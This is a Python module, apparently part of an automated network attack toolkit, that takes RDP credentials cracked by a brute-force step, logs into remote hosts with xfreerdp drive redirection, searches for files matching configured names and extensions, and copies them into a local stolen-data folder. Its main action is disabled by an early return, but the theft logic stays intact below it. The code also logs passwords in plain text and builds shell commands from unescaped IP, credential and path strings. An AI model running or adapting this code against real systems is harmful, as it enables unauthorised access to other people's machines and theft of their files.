"""
steal_files_rdp.py - This script connects to remote RDP servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import subprocess
import logging
import time
from shared import SharedData
from logger import Logger
from timeout_utils import subprocess_with_timeout, TimeoutContext

# Configure the logger
logger = Logger(name="steal_files_rdp.py", level=logging.INFO)

# Define the necessary global variables
b_class = "StealFilesRDP"
b_module = "steal_files_rdp"
b_status = "steal_files_rdp"
b_parent = "RDPBruteforce"
b_port = 3389

class StealFilesRDP:
    """
    Class to handle the process of stealing files from RDP servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.rdp_connected = False
            self.stop_execution = False
            self.b_parent_action = "brute_force_rdp"  # Parent action status key
            logger.info("StealFilesRDP initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_rdp(self, ip, username, password):
        """
        Establish an RDP connection with drive redirection.
        NOTE: The bundled sfreerdp does not support drive redirection.
        This requires the full xfreerdp client with channel support.
        Uses 120 second timeout for subprocess.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("RDP connection attempt interrupted due to orchestrator exit.")
                return None
            # Get path to bundled xfreerdp binary (note: drive redirection not supported)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            xfreerdp_path = os.path.join(script_dir, "bin", "xfreerdp")
            if not os.path.exists(xfreerdp_path):
                xfreerdp_path = "xfreerdp"
            command = f"{xfreerdp_path} /v:{ip} /u:{username} /p:{password} /drive:shared,/mnt/shared"
            stdout, stderr, returncode = subprocess_with_timeout(command, timeout=120)
            if returncode == 0:
                logger.info(f"Connected to {ip} via RDP with username {username}")
                self.rdp_connected = True
                return True  # Return True instead of process since we can't use completed process
            else:
                logger.error(f"Error connecting to RDP on {ip} with username {username}: {stderr.decode()}")
                return None
        except TimeoutError:
            logger.lifecycle_timeout("StealFilesRDP", "xfreerdp connection", 120, ip)
            return None
        except Exception as e:
            logger.error(f"Error connecting to RDP on {ip} with username {username}: {e}")
            return None

    def find_files(self, client, dir_path):
        """
        Find files in the remote directory based on the configuration criteria.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted due to orchestrator exit.")
                return []
            # Assuming that files are mounted and can be accessed via SMB or locally
            files = []
            for root, dirs, filenames in os.walk(dir_path):
                for filename in filenames:
                    filepath = os.path.join(root, filename)
                    # Match by extension
                    if any(filename.endswith(ext) for ext in self.shared_data.steal_file_extensions):
                        files.append(filepath)
                    # Match by name: path patterns (start with /) match end of path, others match basename
                    elif any(filepath.endswith(fn) if fn.startswith('/') else fn == filename
                             for fn in self.shared_data.steal_file_names):
                        files.append(filepath)
            logger.info(f"Found {len(files)} matching files in {dir_path}")
            return files
        except Exception as e:
            logger.error(f"Error finding files in directory {dir_path}: {e}")
            return []

    def steal_file(self, remote_file, local_dir):
        """
        Download a file from the remote server to the local directory.
        Uses 60 second timeout for copy operation.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File stealing process interrupted due to orchestrator exit.")
                return
            local_file_path = os.path.join(local_dir, os.path.basename(remote_file))
            os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
            command = f"cp {remote_file} {local_file_path}"
            stdout, stderr, returncode = subprocess_with_timeout(command, timeout=60)
            if returncode == 0:
                logger.success(f"Downloaded: {remote_file}")
            else:
                logger.error(f"Error downloading file {remote_file}: {stderr.decode()}")
        except TimeoutError:
            logger.lifecycle_timeout("StealFilesRDP", "file copy", 60)
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using RDP.
        NOTE: This action is disabled because sfreerdp doesn't support drive redirection.
        The full xfreerdp client with channel support would be required.
        """
        # Disabled - sfreerdp doesn't support drive redirection needed for file stealing
        logger.debug(f"StealFilesRDP is disabled (sfreerdp doesn't support drive redirection)")
        return 'success'  # Return success to avoid retry tracking

        start_time = time.time()
        logger.lifecycle_start("StealFilesRDP", ip, port)
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesRDP"
                logger.info(f"Stealing files from {ip}:{port}...")

                # Get RDP credentials from the cracked passwords file
                rdpfile = self.shared_data.rdpfile
                credentials = []
                if os.path.exists(rdpfile):
                    with open(rdpfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            line = line.strip()
                            if not line:  # Skip empty lines
                                continue
                            parts = line.split(',')
                            if len(parts) >= 5 and parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealFilesRDP", 'failed', duration, ip)
                    return 'failed'

                def handle_timeout():
                    """
                    Timeout handler to stop the execution if no RDP connection is established.
                    """
                    if not self.rdp_connected:
                        logger.lifecycle_timeout("StealFilesRDP", "RDP connection", 240, ip)
                        self.stop_execution = True

                # Use TimeoutContext instead of Timer(240)
                with TimeoutContext(timeout=240, on_timeout=handle_timeout) as timeout_ctx:
                    # Attempt to steal files using each credential
                    success = False
                    for username, password in credentials:
                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                            logger.info("Steal files execution interrupted due to orchestrator exit.")
                            break
                        try:
                            logger.info(f"Trying credential {username}:{password} for {ip}")
                            client = self.connect_rdp(ip, username, password)
                            if client:
                                remote_files = self.find_files(client, '/mnt/shared')
                                mac = row['MAC Address']
                                local_dir = os.path.join(self.shared_data.datastolendir, f"rdp/{mac}_{ip}")
                                if remote_files:
                                    for remote_file in remote_files:
                                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                            logger.info("File stealing process interrupted due to orchestrator exit.")
                                            break
                                        self.steal_file(remote_file, local_dir)
                                    success = True
                                    countfiles = len(remote_files)
                                    logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
                                if success:
                                    duration = time.time() - start_time
                                    logger.lifecycle_end("StealFilesRDP", 'success', duration, ip)
                                    return 'success'  # Return success if the operation is successful
                        except Exception as e:
                            logger.error(f"Error stealing files from {ip} with username {username}: {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealFilesRDP", 'failed', duration, ip)
                    return 'failed'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                duration = time.time() - start_time
                logger.lifecycle_end("StealFilesRDP", 'skipped', duration, ip)
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            duration = time.time() - start_time
            logger.lifecycle_end("StealFilesRDP", 'failed', duration, ip)
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_rdp = StealFilesRDP(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
